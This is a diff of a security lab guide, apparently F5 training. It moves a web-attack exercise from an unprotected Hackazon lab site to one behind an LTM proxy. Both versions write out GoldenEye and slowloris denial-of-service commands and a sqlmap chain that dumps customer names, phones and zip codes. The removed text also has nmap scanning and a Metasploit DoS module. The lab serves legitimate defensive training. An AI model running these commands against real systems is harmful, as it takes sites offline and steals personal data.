@@ -1,155 +1,103 @@
-Attack Unprotected Web App
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Attack Web App behind LTM
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
--  Tasks in red performed on Kali host
+-  Before we put F5’s WAF into the mix, lets run some of the same
+       attacks with the resource behind LTM
 
--  Tasks in blue performed on Hackazon
+-  We will start our testing with LTM configured with **only** a TCP
+       profile. Let’s examine the impact of a L4 vs L7 proxy.
 
-1. Open a putty session to the Kali server and Hackazon server
+-  *Will a L4 (TCP) or L7 (HTTP) profile mitigate attacks?*
 
-2. Verify site availability and capture server stats
+-  Estimated time for completion: 30 minutes
 
-   a. Browse http://hackazon.f5agility.com
-
-   b. (Hackazon) View server base stats
-
-      i.   # free -m
-
-      ii.  # pgrep httpd \| wc -l
-
-      iii. # top
-
-   c. Open BIG-IP Dashboard
-
-3. Attack via GoldenEye
+1. Attack via GoldenEye
 
    a. (Kali) Browse to GoldenEye directory and execute attack.
 
       i.  # cd /root/Agility/GoldenEye
 
-      ii. # ./goldeneye.py http://hackazon.f5agility.com -d -w 50 -s 200
+      ii. # ./goldeneye.py http://hackazon-tcp.f5agility.com -d -w 50 -s
+          200
 
-   b. Is site available?
+   b. Observe impact
 
-      i. http://hackazon.f5agility.com
+      i.   Is site available?
 
-   c. (Hackazon) Observe impact
+      ii.  Review LTM virtual Server statistics
 
-      i.  # top
+      iii. (Hackazon) Server Stats
 
-      ii. # free -m
+           1. # top
 
-   d. (Kali) Stop attack
+           2. # free –m
+
+   c. (Kali) Stop attack
 
       i. <Ctrl>+C
 
-4. Verify test site availability
-
-   a. http://hackazon.f5agility.com
-
-   b. If site unavailable, restart web service on Hackazon host
-
-      i. # /etc/init.d/apache2 restart
-
-5. Attack via SLOWHTTPTEST
+2. Attack via SLOWHTTPTEST
 
    a. (Kali) Browse to slowhttptest directory and execute attack
 
       i.  # cd /root/Agility/slowhttptest
 
-      ii. |image6|\ # slowhttptest -c 1000 -H -g -o
-          slowloris\_stats\_lab1 -i 10 -r 200 -s 8192 -t GET -u
-          http://hackazon.f5agility.com -x 24 -p 3
+      ii. # slowhttptest -c 1000 -H -g -o slowloris\_stats\_lab3 -i 10
+          -r 200 -s 8192 -t GET -u http://hackazon-tcp.f5agility.com -x
+          24 -p 3
 
-   b. Is site available?
+   b. Observe impact
 
-   c. (Hackazon) Observe impact
+      i.   Is site available?
 
-      i.  # top
+      ii.  Review LTM virtual Server statistics
 
-      ii. # free -m
+      iii. Review LTM Dashboard
 
-   d. (Kali) Stop Attack
+      iv.  (Hackazon) Server Stats
+
+           1. # top
+
+           2. # free –m
+
+   c. Stop Attack
 
       i. <Ctrl>+C
 
-   e. (Hackazon) Restart web services
+   d. # /etc/init.d/httpd restart
 
-      i. # /etc/init.d/httpd restart
+3. Attack via SQLMap
 
-6. Attack via SQLMap
+   a. (Kali) Repeat SQL Injection from previous lab
 
-   a. To begin we’ll need to browse the site for a URL that looks
-      injectable, like this one:
+      i.   # cd /root/Agility/sqlmap
 
-      i. http://hackazon.f5agility.com/product/view?id=51
+      ii.  # sqlmap -u
+           http://hackazon-tcp.f5agility.com/product/view?id=51 --dbs
 
-   b. (Kali) Determine database type
+      iii. # sqlmap -u
+           http://hackazon-tcp.f5agility.com/product/view?id=51 -D
+           hackazon --tables
 
-      i.   |image7|\ # sqlmap -u
-           http://hackazon.f5agility.com/product/view?id=51 --dbs
+      iv.  # sqlmap -u
+           http://hackazon-tcp.f5agility.com/product/view?id=51 -D
+           hackazon -T tbl\_customer\_address --columns
 
-      ii.  Select ‘C’
+      v.   # sqlmap -u
+           http://hackazon-tcp.f5agility.com/product/view?id=51 -D
+           hackazon -T tbl\_customer\_address -C full\_name,phone,zip
+           --dump
 
-      iii. |image8|\ DB identified as ‘MySQL’, Select ‘Y’, then ‘Y’
+   b. Observe impact
 
-   c. (Kali) Determine Table Names
+      i.  Is site available?
 
-      i.  |image9|\ Choose a discovered Database and query for table
+      ii. (Hackazon) Server Stats
 
-      ii. |image10|\ # sqlmap -u
-          http://hackazon.f5agility.com/product/view?id=51 -D hackazon
-          --tables
+          1. # top
 
-   d. Now for the columns
+          2. # free –m
 
-      i. sqlmap -u http://hackazon.f5agility.com/product/view?id=51 -D
-         hackazon -T tbl\_customer\_address --columns
+4. Repeat steps 1-6 with host below and note differences
 
-   e. |image11|\ And finally…lets extract some data
-
-      i. sqlmap -u http://hackazon.f5agility.com/product/view?id=51 -D
-         hackazon -T tbl\_customer\_address -C full\_name,phone,zip
-         --dump
-
-   f. Did these attacks bring the site offfline?
-
-7. (Optional) Attack via Metasploit
-
-   a. (Kali) Open Metasploit console
-
-      i. # msfconsole
-
-   b. (Kali) Port scan the vulnerable host
-
-      i. msf > nmap -sS -A hackazon.f5agility.com
-
-    |image12|
-
-a. Search for an exploit
-
-   i. Take information provided above and find an exploit/CVE!
-
-b. (Kali) Configure exploit (example)
-
-   i.   msf > use auxiliary/dos/http/apache\_range\_dos
-
-   ii.  msf auxiliary(apache\_range\_dos) > show options
-
-   iii. set RHOSTS 10.128.20.210
-
-c. (Kali) Attack!
-
-   i. msf > run
-
-d. Is site available?
-
-e. (Hackazon) Observe impact
-
-   i.  # top
-
-   ii. # free –m
-
-f. Stop attack
-
-g. # /etc/init.d/httpd restart
+   a. http://hackazon-http.f5agility.com
